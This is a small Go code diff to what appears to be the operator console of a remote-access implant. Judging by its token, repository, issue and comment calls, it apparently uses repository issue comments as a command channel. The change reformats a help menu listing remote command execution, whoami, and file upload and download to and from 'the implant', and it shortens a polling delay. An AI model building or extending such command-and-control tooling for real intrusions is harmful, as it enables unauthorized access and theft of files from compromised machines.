@@ -204,13 +204,13 @@ func uploadFile(token, user, repo, localFilePath, remoteFileName string) error {
 }
 
 func printHelp() {
-	fmt.Println("help : show this help menu")
-	fmt.Println("pwd : print working directory")
-	fmt.Println("whoami : get username")
-	fmt.Println("cmd <command> : execute command")
-	fmt.Println("upload <local_file_path> <remote_file_name> : upload local file to the implant")
-	fmt.Println("download <remote_file_name> <local_file_path> : download file of implant to local path")
-	fmt.Println("exit : kill the connection with the implant")
+	fmt.Println(" - help : show this help menu")
+	fmt.Println(" - pwd : print working directory")
+	fmt.Println(" - whoami : get username")
+	fmt.Println(" - cmd <command> : execute command")
+	fmt.Println(" - upload <local_file_path> <remote_file_name> : upload local file to the implant")
+	fmt.Println(" - download <remote_file_name> <local_file_path> : download file of implant to local path")
+	fmt.Println(" - exit : kill the connection with the implant")
 }
 
 func main() {
@@ -248,7 +248,7 @@ func main() {
 				continue
 			}
 
-			time.Sleep(8 * time.Second)
+			time.Sleep(5 * time.Second)
 
 			issueNbrStr := fmt.Sprintf("%d", issueNbr)
 			comment, err := GetComment(token, owner, repo, issueNbrStr)
